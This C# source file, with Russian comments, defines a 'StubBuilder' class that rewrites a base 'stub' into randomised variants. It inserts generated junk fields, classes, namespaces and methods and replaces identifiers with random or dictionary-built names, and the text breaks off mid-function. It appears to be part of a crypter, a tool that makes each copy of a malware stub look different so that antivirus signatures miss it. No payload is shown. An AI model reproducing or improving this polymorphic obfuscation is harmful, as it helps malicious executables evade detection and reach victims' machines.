using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Reflection;

namespace WY_47_89
{
    class StubBuilder//данный класс принимает базовый стаб в виде string строки и преобразует в новую измененную рандомную строку с мусорным кодом и подменой имен переменных и процедур
    {
        public static string strX = Properties.Resources.Dictionary;// строка словаря
        public static bool bDicX;
        public static List<string> ListUniqueNames = new List<string>();//лист уникальных имен

        public static List<string> ListTriggersBase = new List<string>();//лист базовых триггеров
        public static List<string> ListTriggersMeta = new List<string>();//лист триггеров метаописания
        public static List<string> ListTriggersAssembly = new List<string>();//лист триггеров числовой информации о сборке
        public static List<string> ListTriggersProcedure = new List<string>();//лист триггеров в функциях
        public static List<string> ListTriggersBetween = new List<string>();//лист триггеров между функциями
        public static List<string> ListTriggersTryCatch = new List<string>();//лист триггеров между функциями
        public static List<string> ListTriggersClass = new List<string>();//лист триггеров классов
        public static List<string> ListTriggersNamespace = new List<string>();//лист триггеров пространств имен

        public static List<string> ListTriggersProcedureS = new List<string>();//лист триггеров в функциях

        public delegate string Instruction(ref string in0,ref string inNull0);
        private static Instruction[] InstructionsInProcedureS = {
            Instructions.InstructionAny0,
            Instructions.InstructionAny1,
            Instructions.InstructionAny2,
            Instructions.InstructionAny3,
            Instructions.InstructionAny4,
            Instructions.InstructionAny5,
            Instructions.InstructionAny6,
            Instructions.InstructionAny7,
            Instructions.InstructionAny8,
            Instructions.InstructionAny9,
            Instructions.InstructionAny10,
            Instructions.InstructionAny11,
            Instructions.InstructionAny12,
            Instructions.InstructionAny13,
        };//массив возможных инструкций внутри инструкциий процедур

        private static Instruction[] InstructionsInProcedure= {
            Instructions.InstructionAny0,
            Instructions.InstructionAny1,
            Instructions.InstructionAny2,
            Instructions.InstructionAny3,
            Instructions.InstructionAny4,
            Instructions.InstructionAny5,
            Instructions.InstructionAny6,
            Instructions.InstructionAny7,
            Instructions.InstructionAny8,
            Instructions.InstructionAny9,
            Instructions.InstructionAny10,
            Instructions.InstructionAny11,
            Instructions.InstructionAny12,
            Instructions.InstructionAny13,
            //Instructions.InstructionAny14,
            //Instructions.InstructionAny15,
            //Instructions.InstructionAny16,
            Instructions.InstructionAny17,
            //Instructions.InstructionAny18,

        };//массив возможных инструкций в процедурах

        private static Instruction[] InstructionInTryCatch = {
            Instructions.InstructionAny0,
            Instructions.InstructionAny1,
            Instructions.InstructionAny2,
            Instructions.InstructionAny3,
            Instructions.InstructionAny4,
            Instructions.InstructionAny5,
            Instructions.InstructionAny6,
            Instructions.InstructionAny7,
            Instructions.InstructionAny8,
            Instructions.InstructionAny10,
            Instructions.InstructionAny11,
            Instructions.InstructionAny12,
            Instructions.InstructionAny13,
            //Instructions.InstructionAny15,
            //Instructions.InstructionAny16,
            Instructions.InstructionAny17,
            //Instructions.InstructionAny18,

        };//массив возможных инструкций внутри блоков try catch

        private static Instruction[] InstructionBetweenProcedure = {
            Instructions.InstructionAnyStatic0,
            Instructions.InstructionAnyStatic1,
            Instructions.InstructionAnyStatic2,
            Instructions.InstructionAnyStatic3,
            Instructions.InstructionAnyStatic4,
            Instructions.InstructionAnyStatic5,
            Instructions.InstructionAnyStatic6,
            Instructions.InstructionAnyStatic7,
            Instructions.InstructionAnyStatic8,
            Instructions.InstructionAnyStatic9,
            Instructions.InstructionAnyStatic10,
            Instructions.InstructionAnyStatic11,
            Instructions.InstructionAnyStatic12,
            Instructions.InstructionAnyStatic13,
            Instructions.InstructionAnyStatic14,
            Instructions.InstructionAnyStatic15,
            Instructions.InstructionAnyStatic16,
            Instructions.InstructionAnyStatic17,
            Instructions.InstructionAnyStatic18,
            Instructions.InstructionAnyStatic19,
            Instructions.InstructionAnyStatic20,
            Instructions.InstructionAnyStatic21,
            Instructions.InstructionAnyStatic22,
            Instructions.InstructionAnyStatic23,
            //Instructions.InstructionAnyStatic24,
            //Instructions.InstructionAnyStatic25,
            //Instructions.InstructionAnyStatic26,
            //Instructions.InstructionAnyStatic27,
            //Instructions.InstructionAnyStatic28,

        };//массив возможных инструкций между процедурами

        private static Instruction[] InstructionEwerywhere = {
            Instructions.InstructionAnyEverywhere0,
            Instructions.InstructionAnyEverywhere1,
            //Instructions.InstructionAnyEverywhere2,
            //Instructions.InstructionAnyEverywhere3,
            //Instructions.InstructionAnyEverywhere4,
            //Instructions.InstructionAnyEverywhere5,
            //Instructions.InstructionAnyEverywhere6,
            //Instructions.InstructionAnyEverywhere7,

        };//массив возможных инструкций везде

        private static Instruction[] InstructionClass = {
            Instructions.InstructionClass0,
            Instructions.InstructionClass1,
        };//массив возможных инструкций везде

        private static Instruction[] InstructionNamespace = {
            Instructions.InstructionNamespace0,
            Instructions.InstructionNamespace1,

        };//массив возможных инструкций везде

        private static Instruction[] InstructionInStruct = {
            Instructions.InstructionAnyStruct0,
            Instructions.InstructionAnyStruct1,
            Instructions.InstructionAnyStruct2,
            Instructions.InstructionAnyStruct3,
            Instructions.InstructionAnyStruct4,
            Instructions.InstructionAnyStruct5,
        };//массив возможных инструкций в структуре

        private static Instruction[] InstructionInEnum = {
            Instructions.InstructionAnyEnum0,
            Instructions.InstructionAnyEnum1,
            //Instructions.InstructionAnyEnum2,
            //Instructions.InstructionAnyEnum3,
            //Instructions.InstructionAnyEnum4,
            //Instructions.InstructionAnyEnum5,
        };//массив возможных инструкций в Enum

        private static Instruction[] InstructionsMeta = {
            //Instructions.InstructionMeta0,
            //Instructions.InstructionMeta1,
        };//массив возможных инструкций метаданных

        public static class Instructions
        {
            //параметры рандомизатора
            static int RandomizeDeepMax = 3;//глубина фрактала рандома
            static int RandomUpdateCycles = 1500;//цикличность рандома
            static Random rnd = new Random();
            static int CycleNum = rnd.Next(161, RandomUpdateCycles + 161);//вспомогательная переменная счетчик для функции рандома

            public static int RandomizeInt(int MinInt0, int MaxInt0, int RandomizeDeep0)//функция выбирающая произвольное целое число из диапазона
            {
                int rez;
                double psi;
                int ChozenInt;
                int BasicA = RandomUpdateCycles + 161;

                if (RandomizeDeep0 < RandomizeDeepMax)
                {
                    ChozenInt = RandomizeInt(161, BasicA, RandomizeDeep0 + 1);
                }
                else
                {
                    if (CycleNum < BasicA && CycleNum >= 161)
                    {
                        CycleNum = CycleNum + 1;
                    }
                    if (CycleNum >= BasicA)
                    {
                        CycleNum = 161;
                    }
                    ChozenInt = CycleNum;
                }


                psi = ((ChozenInt) * 1.412) * (MaxInt0 + 1 - MinInt0);
                rez = MinInt0 + (int)(Math.Abs((MaxInt0 + 1 - MinInt0) * (psi - Math.Truncate(psi))));
                return rez;
            }
            ///

            public static string GenerateRandomString()//генерация рандомной строчки
            {
                string result = "";
                bDicX = Form1.Dic0X;
                if (bDicX == false)
                {
                    string abc = "QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm_0123456789";
                    
                    int iter = rnd.Next(5, abc.Length);
                    while (result == "" || result[0].ToString() == "0" || result[0].ToString() == "1" || result[0].ToString() == "2"
                           || result[0].ToString() == "3" || result[0].ToString() == "4" || result[0].ToString() == "5" || result[0].ToString() == "6"
                           || result[0].ToString() == "7" || result[0].ToString() == "8" || result[0].ToString() == "9")
                    {
                        result = "";
                        for (int i = 0; i < iter; i++)
                            result += abc[rnd.Next(0, abc.Length)];
                    }
                    return result;
                }
                else
                {
                    result= BuildWord(ref strX, 3);
                    //MessageBox.Show(result);
                    return result;
                }
            }

            public static bool ContainsBytes(ref string StrIn ,string SubIn)//содержит ли символы байтов
            {
                for (int i = 0; i < StrIn.Length; i++)
                {
                    //MessageBox.Show(((byte)StrIn[i]).ToString());
                    if ( ((byte)StrIn[i]).ToString() == SubIn )
                    {
                        return true;
                    }
                }
                return false;
            }

            public static void CorrectChars(ref string strR0)
            {
                bool rez = false;
                bool baccess = false;
                int indstart = 0;
                string abc = "QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm";
                RestartLabel:

                for (int i = indstart; i < strR0.Length; i++)
                {
                    baccess = false;
                    for (int j = 0; j < abc.Length; j++)
                    {
                        if ( strR0[i] == abc[j] )
                        {
                            baccess = true;
                            break;
                        }
                    }
                    if ( baccess == false )
                    {
                        //MessageBox.Show(strR0);
                        strR0 = strR0.Remove(i, 1);
                        //MessageBox.Show(strR0);
                        indstart = i;
                        //MessageBox.Show("del");
                        goto RestartLabel;
                    }
                }
            }

            public static string BuildWord(ref string strXR, int words0)//построим рандомное слово из словаря
            {
                Begin:
                string TempSub;
                string TempSubX;
                string SumSub = "";
                string SumSubTemp = "";
                int StartIndex;
                bool access;
                int WordComplex = GenerateRandomInt(1, words0 + 1);
                for (int i = 0; i < WordComplex; ++i)
                {
                    access = false;
                    while (access == false)
                    {

                        StartIndex = GenerateRandomInt(strXR.Length);

                        for (int j = StartIndex; j < strXR.Length; ++j)
                        {
                            TempSub = strXR.Substring(j, 1);
                            char Ch1 = TempSub.ToCharArray()[0];
                            char[] Ch2 = null;
                            if (j + 1 < strXR.Length)
                            {
                                TempSubX = strXR.Substring(j, 2);
                                Ch2 = TempSubX.ToCharArray();
                            }



                            if ((j + 1 < strXR.Length && ((byte)Ch2[0]).ToString() == "13" && ((byte)Ch2[1]).ToString() == "10") || ((byte)Ch1).ToString() == "32")
                            {
                                if (((byte)Ch2[0]).ToString() == "13" && ((byte)Ch2[1]).ToString() == "10" && j + 2 < strXR.Length)
                                {
                                    for (int k = j + 2; k < strXR.Length; ++k)
                                    {
                                        TempSub = strXR.Substring(k, 1);
                                        if (k + 1 < strXR.Length)
                                        {
                                            TempSubX = strXR.Substring(k, 2);
                                            Ch2 = TempSubX.ToCharArray();
                                        }

                                        Ch1 = TempSub.ToCharArray()[0];

                                        if ((k + 1 < strXR.Length && (((byte)Ch2[0]).ToString() != "13" || ((byte)Ch2[1]).ToString() != "10")) && ((byte)Ch1).ToString() != "32")
                                        {
                                            for (int p = k; p < strXR.Length; ++p)
                                            {
                                                TempSub = strXR.Substring(p, 1);
                                                if (p + 1 < strXR.Length)
                                                {
                                                    TempSubX = strXR.Substring(p, 2);
                                                    Ch2 = TempSubX.ToCharArray();
                                                }
                                                Ch1 = TempSub.ToCharArray()[0];

                                                if ((p + 1 < strXR.Length && ((byte)Ch2[0]).ToString() == "13" && ((byte)Ch2[1]).ToString() == "10") || ((byte)Ch1).ToString() == "32")
                                                {
                                                    SumSubTemp = SumSub + strXR.Substring(k, p - k);
                                                    CorrectChars(ref SumSubTemp);
                                                    SumSub = SumSubTemp;
                                                    access = true;
                                                    goto LabelEnd;
                                                }
                                            }
                                        }
                                    }
                                }
                                if (((byte)Ch1).ToString() == "32" && j + 1 < strXR.Length)
                                {
                                    for (int k = j + 1; k < strXR.Length; ++k)
                                    {
                                        TempSub = strXR.Substring(k, 1);
                                        if (k + 1 < strXR.Length)
                                        {
                                            TempSubX = strXR.Substring(k, 2);
                                            Ch2 = TempSubX.ToCharArray();
                                        }

                                        Ch1 = TempSub.ToCharArray()[0];

                                        if ((k + 1 < strXR.Length && (((byte)Ch2[0]).ToString() != "13" || ((byte)Ch2[1]).ToString() != "10")) && ((byte)Ch1).ToString() != "32")
                                        {
                                            for (int p = k; p < strXR.Length; ++p)
                                            {
                                                TempSub = strXR.Substring(p, 1);
                                                if (p + 1 < strXR.Length)
                                                {
                                                    TempSubX = strXR.Substring(p, 2);
                                                    Ch2 = TempSubX.ToCharArray();
                                                }
                                                Ch1 = TempSub.ToCharArray()[0];

                                                if ((p + 1 < strXR.Length && ((byte)Ch2[0]).ToString() == "13" && ((byte)Ch2[1]).ToString() == "10") || ((byte)Ch1).ToString() == "32")
                                                {
                                                    SumSubTemp = SumSub + strXR.Substring(k, p - k);
                                                    CorrectChars(ref SumSubTemp);
                                                    SumSub = SumSubTemp;
                                                    access = true;
                                                    goto LabelEnd;
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }


                    }
                    LabelEnd:;
                }

                foreach ( string XA in ListUniqueNames)
                {
                    if ( XA == SumSub )
                    {
                        goto Begin;
                    }
                }
                ListUniqueNames.Add(SumSub);

                return SumSub;
            }

            public static string GenerateRandomStringAssembly()//генерация рандомной строчки без цифр
            {
                string abc = "0123456789";
                string result = "";
                char iter = abc[rnd.Next(0, abc.Length)];
                result = result + iter;
                result = result + ".";
                iter = abc[rnd.Next(0, abc.Length)];
                result = result + iter;
                result = result + ".";
                iter = abc[rnd.Next(0, abc.Length)];
                result = result + iter;

                return result;
            }

            public static int GenerateRandomInt()//генерация рандомного int числа в диапазоне [0,25]
            {
                int iter = rnd.Next(0, 25);
                return iter;
            }

            public static int GenerateRandomInt(int max0)//генерация рандомного int числа в диапазоне [0,введеное значение]
            {
                int iter = rnd.Next(0, max0);
                return iter;
            }

            public static int GenerateRandomInt(int min0,int max0)//генерация рандомного int числа в диапазоне [минимальное значение,максимальное значение]
            {
                int iter = rnd.Next(min0, max0);
                return iter;
            }

            public static double GenerateRandomDouble()//генерация рандомного int числа в диапазоне [0,136906 int]
            {
                double iter = rnd.Next(0, 136906);
                return iter;
            }

            public static bool GenerateRandomBool()//генерация рандомной булевой
            {
                int iter = RandomizeInt(0, 14963437,0);
                if ( iter >= 14963437.0/2.0 )
                {
                    //MessageBox.Show(string.Format("str= "+"true"));
                    return true;
                }
                else
                {
                    //MessageBox.Show(string.Format("str= "+"false"));
                    return false;
                }
            }

            public static string stringbool(bool b0)
            {
                if ( b0 == true )
                {
                    return "true";
                }
                else
                {
                    return "false";
                }

            }

            public static int GenerateRandomIntHuge()//генерация рандомного int числа в диапазоне [0,136906]
            {
                int iter = rnd.Next(0, 136906);
                return iter;
            }

            public static bool IsSubInString(ref string StringBase0, ref string StringSub0)//проверяет содержится ли в строке субстрока
            {
                return StringBase0.Contains(StringSub0);
            }

            public static string InstructionClass0(ref string str0, ref string inNull0)//первый тип инструкции для class
            {
                string strtemp = " public static class %var123%{ %$#@betweentrigger0@#$% %$#@betweentrigger1@#$% %$#@betweentrigger2@#$% " +
                    "%$#@betweentrigger3@#$% %$#@betweentrigger4@#$% %$#@betweentrigger5@#$% %$#@betweentrigger6@#$% " +
                    "%$#@betweentrigger7@#$% %$#@betweentrigger8@#$% %$#@betweentrigger9@#$% %$#@betweentrigger10@#$% " +
                    "%$#@betweentrigger11@#$% %$#@betweentrigger12@#$% %$#@betweentrigger13@#$% %$#@betweentrigger14@#$% } ";

                string sHelp = "";

                sHelp = GenerateRandomString();
                while (IsSubInString(ref strtemp, ref sHelp) || IsSubInString(ref str0, ref sHelp))//ищем новое название для триггера пока не найдется то которое уже не содержится в модифицированном коде стаба
                {
                    sHelp = GenerateRandomString();
                }
                strtemp = strtemp.Replace("%var123%", sHelp);//после того как нашли заменяем триггер на наше новое имя

                ModifyAllUniqueTriggersBetweenClass(ref strtemp);
                //MessageBox.Show(strtemp);

                return strtemp;
            }

            public static string InstructionClass1(ref string str0, ref string inNull0)//первый тип инструкции для class
            {
                string strtemp = " public unsafe class %var123%{ %$#@betweentrigger0@#$% %$#@betweentrigger1@#$% %$#@betweentrigger2@#$% " +
                    "%$#@betweentrigger3@#$% %$#@betweentrigger4@#$% %$#@betweentrigger5@#$% %$#@betweentrigger6@#$% " +
                    "%$#@betweentrigger7@#$% %$#@betweentrigger8@#$% %$#@betweentrigger9@#$% %$#@betweentrigger10@#$% " +
                    "%$#@betweentrigger11@#$% %$#@betweentrigger12@#$% %$#@betweentrigger13@#$% %$#@betweentrigger14@#$% " +
                    "%$#@betweentrigger15@#$% %$#@betweentrigger16@#$% %$#@betweentrigger17@#$% %$#@betweentrigger18@#$% } ";

                string sHelp = "";

                sHelp = GenerateRandomString();
                while (IsSubInString(ref strtemp, ref sHelp) || IsSubInString(ref str0, ref sHelp))//ищем новое название для триггера пока не найдется то которое уже не содержится в модифицированном коде стаба
                {
                    sHelp = GenerateRandomString();
                }
                strtemp = strtemp.Replace("%var123%", sHelp);//после того как нашли заменяем триггер на наше новое имя

                ModifyAllUniqueTriggersBetweenClass(ref strtemp);
                //MessageBox.Show(strtemp);

                return strtemp;
            }

            public static string InstructionNamespace0(ref string str0, ref string inNull0)//первый тип инструкции для class
            {
                string strtemp = " namespace %var123%{ %$#@classtrigger0@#$% %$#@classtrigger1@#$% %$#@classtrigger2@#$% " +
                    "%$#@classtrigger3@#$% %$#@classtrigger4@#$% } ";

                string sHelp = "";

                sHelp = GenerateRandomString();
                while (IsSubInString(ref strtemp, ref sHelp) || IsSubInString(ref str0, ref sHelp))//ищем новое название для триггера пока не найдется то которое уже не содержится в модифицированном коде стаба
                {
                    sHelp = GenerateRandomString();
                }
                strtemp = strtemp.Replace("%var123%", sHelp);//после того как нашли заменяем триггер на наше новое имя

                ModifyAllUniqueTriggersBetweenNamespace(ref strtemp);
                //MessageBox.Show(strtemp);

                return strtemp;
            }

            public static string InstructionNamespace1(ref string str0, ref string inNull0)//первый тип инструкции для class
            {
                string strtemp = " namespace %var123%{ %$#@classtrigger0@#$% %$#@classtrigger1@#$% %$#@classtrigger2@#$% " +
                    "%$#@classtrigger3@#$%  } ";

                string sHelp = "";

                sHelp = GenerateRandomString();
                while (IsSubInString(ref strtemp, ref sHelp) || IsSubInString(ref str0, ref sHelp))//ищем новое название для триггера пока не найдется то которое уже не содержится в модифицированном коде стаба
                {
                    sHelp = GenerateRandomString();
                }
                strtemp = strtemp.Replace("%var123%", sHelp);//после того как нашли заменяем триггер на наше новое имя

                ModifyAllUniqueTriggersBetweenNamespace(ref strtemp);
                //MessageBox.Show(strtemp);

                return strtemp;
            }

            public static string InstructionAnyEverywhere0(ref string str0, ref string inNull0)//первый тип инструкции для struct
            {
                string strtemp = " public int %var123%; ";

                string sHelp = "";

                sHelp = GenerateRandomString();
                while (IsSubInString(ref strtemp, ref sHelp) || IsSubInString(ref str0, ref sHelp))//ищем новое название для триггера пока не найдется то которое уже не содержится в модифицированном коде стаба
                {
                    sHelp = GenerateRandomString();
                }
                strtemp = strtemp.Replace("%var123%", sHelp);//после того как нашли заменяем триггер на наше новое имя

                return strtemp;
            }


            public static string InstructionAnyEverywhere1(ref string str0, ref string inNull0)//второй тип инструкции для struct
            {
                string strtemp = " public string %var123%; ";

                string sHelp = "";

                sHelp = GenerateRandomString();
                while (IsSubInString(ref strtemp, ref sHelp) || IsSubInString(ref str0, ref sHelp))//ищем новое название для триггера пока не найдется то которое уже не содержится в модифицированном коде стаба
                {
                    sHelp = GenerateRandomString();
                }
                strtemp = strtemp.Replace("%var123%", sHelp);//после того как нашли заменяем триггер на наше новое имя

                return strtemp;
            }

            public static string InstructionAnyEverywhere2(ref string str0, ref string inNull0)//третий тип инструкции для struct
            {
                string strtemp = " public bool %var123%; ";

                string sHelp = "";

                sHelp = GenerateRandomString();
                while (IsSubInString(ref strtemp, ref sHelp) || IsSubInString(ref str0, ref sHelp))//ищем новое название для триггера пока не найдется то которое уже не содержится в модифицированном коде стаба
                {
                    sHelp = GenerateRandomString();
                }
                strtemp = strtemp.Replace("%var123%", sHelp);//после того как нашли заменяем триггер на наше новое имя


                return strtemp;
            }

            public static string InstructionAnyEverywhere3(ref string str0, ref string inNull0)//четвертый тип инструкции для struct
            {
                string strtemp = " public double %var123%; ";

                string sHelp = "";

                sHelp = GenerateRandomString();
                while (IsSubInString(ref strtemp, ref sHelp) || IsSubInString(ref str0, ref sHelp))//ищем новое название для триггера пока не найдется то которое уже не содержится в модифицированном коде стаба
                {
                    sHelp = GenerateRandomString();
                }
                strtemp = strtemp.Replace("%var123%", sHelp);//после того как нашли заменяем триггер на наше новое имя

                return strtemp;
            }

            public static string InstructionAnyEverywhere4(ref string str0, ref string inNull0)//пятый тип инструкции для любого места
            {
                string strtemp = " public double %var123%; public bool %var124%; ";

                string sHelp = "";

                sHelp = GenerateRandomString();
                while (IsSubInString(ref strtemp, ref sHelp) || IsSubInString(ref str0, ref sHelp))//ищем новое название для триггера пока не найдется то которое уже не содержится в модифицированном коде стаба
                {
                    sHelp = GenerateRandomString();
                }
                strtemp = strtemp.Replace("%var123%", sHelp);//после того как нашли заменяем триггер на наше новое имя

                sHelp = GenerateRandomString();
                while (IsSubInString(ref strtemp, ref sHelp) || IsSubInString(ref str0, ref sHelp))//ищем новое название для триггера пока не найдется то которое уже не содержится в модифицированном коде стаба
                {
                    sHelp = GenerateRandomString();
                }
                strtemp = strtemp.Replace("%var124%", sHelp);//после того как нашли заменяем триггер на наше новое имя

                return strtemp;
            }

            public static string InstructionAnyEverywhere5(ref string str0, ref string inNull0)//шестой тип инструкции для struct
            {
                string strtemp = " public double %var123%; public long %var124%; ";

                string sHelp = "";

                sHelp = GenerateRandomString();
                while (IsSubInString(ref strtemp, ref sHelp) || IsSubInString(ref str0, ref sHelp))//ищем новое название для триггера пока не найдется то которое уже не содержится в модифицированном коде стаба
                {
                    sHelp = GenerateRandomString();
                }
                strtemp = strtemp.Replace("%var123%", sHelp);//после того как нашли заменяем триггер на наше новое имя

                sHelp = GenerateRandomString();
                while (IsSubInString(ref strtemp, ref sHelp) || IsSubInString(ref str0, ref sHelp))//ищем новое название для триггера пока не найдется то которое уже не содержится в модифицированном коде стаба
                {
                    sHelp = GenerateRandomString();
                }
                strtemp = strtemp.Replace("%var124%", sHelp);//после того как нашли заменяем триггер на наше новое имя

                return strtemp;
            }

            public static string InstructionAnyEverywhere6(ref string str0, ref string inNull0)//седьмой тип инструкции  только для struct
            {
                string strtemp = " public double %var123%; public uint %var124%; ";

                string sHelp = "";

                sHelp = GenerateRandomString();
                while (IsSubInString(ref strtemp, ref sHelp) || IsSubInString(ref str0, ref sHelp))//ищем новое название для триггера пока не найдется то которое уже не содержится в модифицированном коде стаба
                {
                    sHelp = GenerateRandomString();
                }
                strtemp = strtemp.Replace("%var123%", sHelp);//после того как нашли заменяем триггер на наше новое имя

                sHelp = GenerateRandomString();
                while (IsSubInString(ref strtemp, ref sHelp) || IsSubInString(ref str0, ref sHelp))//ищем новое название для триггера пока не найдется то которое уже не содержится в модифицированном коде стаба
                {
                    sHelp = GenerateRandomString();
                }
                strtemp = strtemp.Replace("%var124%", sHelp);//после того как нашли заменяем триггер на наше новое имя

                return strtemp;
            }

            public static string InstructionAnyEverywhere7(ref string str0, ref string inNull0)//восьмой тип инструкции  только для struct
            {
                string strtemp = " public double %var123%; public ulong %var124%; ";

                string sHelp = "";

                sHelp = GenerateRandomString();
                while (IsSubInString(ref strtemp, ref sHelp) || IsSubInString(ref str0, ref sHelp))//ищем новое название для триггера пока не найдется то которое уже не содержится в модифицированном коде стаба
                {
                    sHelp = GenerateRandomString();
                }
                strtemp = strtemp.Replace("%var123%", sHelp);//после того как нашли заменяем триггер на наше новое имя

                sHelp = GenerateRandomString();
                while (IsSubInString(ref strtemp, ref sHelp) || IsSubInString(ref str0, ref sHelp))//ищем новое название для триггера пока не найдется то которое уже не содержится в модифицированном коде стаба
                {
                    sHelp = GenerateRandomString();
                }
                strtemp = strtemp.Replace("%var124%", sHelp);//после того как нашли заменяем триггер на наше новое имя

                return strtemp;
            }

            public static string InstructionAnyStatic0(ref string str0, ref string inNull0)//первый тип инструкции для static класса
            {
                string strtemp = " static int %var123%=%value123%; ";

                string sHelp = "";

                sHelp = GenerateRandomString();
                while (IsSubInString(ref strtemp, ref sHelp) || IsSubInString(ref str0, ref sHelp))//ищем новое название для триггера пока не найдется то которое уже не содержится в модифицированном коде стаба
                {
                    sHelp = GenerateRandomString();
                }
                strtemp = strtemp.Replace("%var123%", sHelp);//после того как нашли заменяем триггер на наше новое имя

                sHelp = GenerateRandomIntHuge().ToString();
                while (IsSubInString(ref strtemp, ref sHelp) || IsSubInString(ref str0, ref sHelp))//ищем новое название для триггера пока не найдется то которое уже не содержится в модифицированном коде стаба
                {
                    sHelp = GenerateRandomIntHuge().ToString();
                }
                strtemp = strtemp.Replace("%value123%", sHelp);//после того как нашли заменяем триггер на наше новое имя

                return strtemp;
            }


            public static string InstructionAnyStatic1(ref string str0, ref string inNull0)//второй тип инструкции для static класса
            {
                string strtemp = " static void %var123%(){%$#@additionaltrigger0@#$% %$#@additionaltrigger1@#$% " +
                "%$#@additionaltrigger2@#$% %$#@additionaltrigger3@#$% %$#@additionaltrigger4@#$%" +
                "%$#@additionaltrigger5@#$% %$#@additionaltrigger6@#$% %$#@additionaltrigger7@#$% %$#@additionaltrigger8@#$% } ";
                //strtemp = " static void %var123%(){} ";

                string sHelp = "";

                sHelp = GenerateRandomString();
                while (IsSubInString(ref strtemp, ref sHelp) || IsSubInString(ref str0, ref sHelp) || IsSubInString(ref inNull0, ref sHelp))//ищем новое название для триггера пока не найдется то которое уже не содержится в модифицированном коде стаба
                {
                    sHelp = GenerateRandomString();
                }
                strtemp = strtemp.Replace("%var123%", sHelp);//после того как нашли заменяем триггер на наше новое имя

                ModifyAllUniqueTriggersVoid(ref str0, ref strtemp);// заполняем все триггеры
                //MessageBox.Show(strtemp);

                return strtemp;
            }

            public static string InstructionAnyStatic2(ref string str0, ref string inNull0)//третий тип инструкции static класса
            {
                string strtemp = " static bool %var123%=%value123%; ";

                string sHelp = "";

                sHelp = GenerateRandomString();
                while (IsSubInString(ref strtemp, ref sHelp) || IsSubInString(ref str0, ref sHelp))//ищем новое название для триггера пока не найдется то которое уже не содержится в модифицированном коде стаба
                {
                    sHelp = GenerateRandomString();
                }
                strtemp = strtemp.Replace("%var123%", sHelp);//после того как нашли заменяем триггер на наше новое имя

                sHelp = stringbool(GenerateRandomBool());
                strtemp = strtemp.Replace("%value123%", sHelp);//после того как нашли заменяем триггер на наше новое имя

                return strtemp;
            }

            public static string InstructionAnyStatic3(ref string str0, ref string inNull0)//четвертый тип инструкции для static класса
            {
                string strtemp = " static double %var123%=%value123%; ";

                string sHelp = "";

                sHelp = GenerateRandomString();
                while (IsSubInString(ref strtemp, ref sHelp) || IsSubInString(ref str0, ref sHelp))//ищем новое название для триггера пока не найдется то которое уже не содержится в модифицированном коде стаба
                {
                    sHelp = GenerateRandomString();
                }
                strtemp = strtemp.Replace("%var123%", sHelp);//после того как нашли заменяем триггер на наше новое имя

                sHelp = GenerateRandomDouble().ToString();
                strtemp = strtemp.Replace("%value123%", sHelp);//после того как нашли заменяем триггер на наше новое имя

                return strtemp;
            }

            public static string InstructionAnyStatic4(ref string str0, ref string inNull0)//пятый тип инструкции static класса
            {
                string strtemp = " static double %var123%=%value123%; static bool %var124%=%value124%; ";

                string sHelp = "";

                sHelp = GenerateRandomString();
                while (IsSubInString(ref strtemp, ref sHelp) || IsSubInString(ref str0, ref sHelp))//ищем новое название для триггера пока не найдется то которое уже не содержится в модифицированном коде стаба
                {
                    sHelp = GenerateRandomString();
                }
                strtemp = strtemp.Replace("%var123%", sHelp);//после того как нашли заменяем триггер на наше новое имя

                sHelp = GenerateRandomDouble().ToString();
                strtemp = strtemp.Replace("%value123%", sHelp);//после того как нашли заменяем триггер на наше новое имя

                sHelp = GenerateRandomString();
                while (IsSubInString(ref strtemp, ref sHelp) || IsSubInString(ref str0, ref sHelp))//ищем новое название для триггера пока не найдется то которое уже не содержится в модифицированном коде стаба
                {
                    sHelp = GenerateRandomString();
                }
                strtemp = strtemp.Replace("%var124%", sHelp);//после того как нашли заменяем триггер на наше новое имя

                sHelp = stringbool(GenerateRandomBool());
                strtemp = strtemp.Replace("%value124%", sHelp);//после того как нашли заменяем триггер на наше новое имя
                //MessageBox.Show(strtemp);

                return strtemp;
            }

            public static string InstructionAnyStatic5(ref string str0, ref string inNull0)//шестой тип инструкции для static класса
            {
                string strtemp = " static int %var123%(string %var124%,int %var125%){%$#@additionaltrigger0@#$% %$#@additionaltrigger1@#$% " +
                "%$#@additionaltrigger2@#$% %$#@additionaltrigger3@#$% %$#@additionaltrigger4@#$%" +
                "%$#@additionaltrigger5@#$% %$#@additionaltrigger6@#$% %$#@additionaltrigger7@#$% %$#@additionaltrigger8@#$% %$#@additionaltrigger9@#$% %$#@additionaltrigger10@#$% return %var125%; } ";
                //strtemp = " static void %var123%(){} ";

                string sHelp = "";

                sHelp = GenerateRandomString();
                while (IsSubInString(ref strtemp, ref sHelp) || IsSubInString(ref str0, ref sHelp) || IsSubInString(ref inNull0, ref sHelp))//ищем новое название для триггера пока не найдется то которое уже не содержится в модифицированном коде стаба
                {
                    sHelp = GenerateRandomString();
                }
                strtemp = strtemp.Replace("%var123%", sHelp);//после того как нашли заменяем триггер на наше новое имя

                sHelp = GenerateRandomString();
                while (IsSubInString(ref strtemp, ref sHelp) || IsSubInString(ref str0, ref sHelp) || IsSubInString(ref inNull0, ref sHelp))//ищем новое название для триггера пока не найдется то которое уже не содержится в модифицированном коде стаба
                {
                    sHelp = GenerateRandomString();
                }
                strtemp = strtemp.Replace("%var124%", sHelp);//после того как нашли заменяем триггер на наше новое имя

                sHelp = GenerateRandomString();
                while (IsSubInString(ref strtemp, ref sHelp) || IsSubInString(ref str0, ref sHelp) || IsSubInString(ref inNull0, ref sHelp))//ищем новое название для триггера пока не найдется то которое уже не содержится в модифицированном коде стаба
                {
                    sHelp = GenerateRandomString();
                }
                strtemp = strtemp.Replace("%var125%", sHelp);//после того как нашли заменяем триггер на наше новое имя

                ModifyAllUniqueTriggersVoid(ref str0, ref strtemp);// заполняем все триггеры
                //MessageBox.Show(strtemp);

                return strtemp;
            }


            public static string InstructionAnyStatic6(ref string str0, ref string inNull0)//седьмой тип инструкции для static класса
            {
                string strtemp = " static double %var123%(double %var124%,ulong %var125%){%$#@additionaltrigger0@#$% %$#@additionaltrigger1@#$% " +
                "%$#@additionaltrigger2@#$% %$#@additionaltrigger3@#$% %$#@additionaltrigger4@#$%" +
                "%$#@additionaltrigger5@#$% %$#@additionaltrigger6@#$% %$#@additionaltrigger7@#$% return %var124%; } ";
                //strtemp = " static void %var123%(){} ";

                string sHelp = "";

                sHelp = GenerateRandomString();
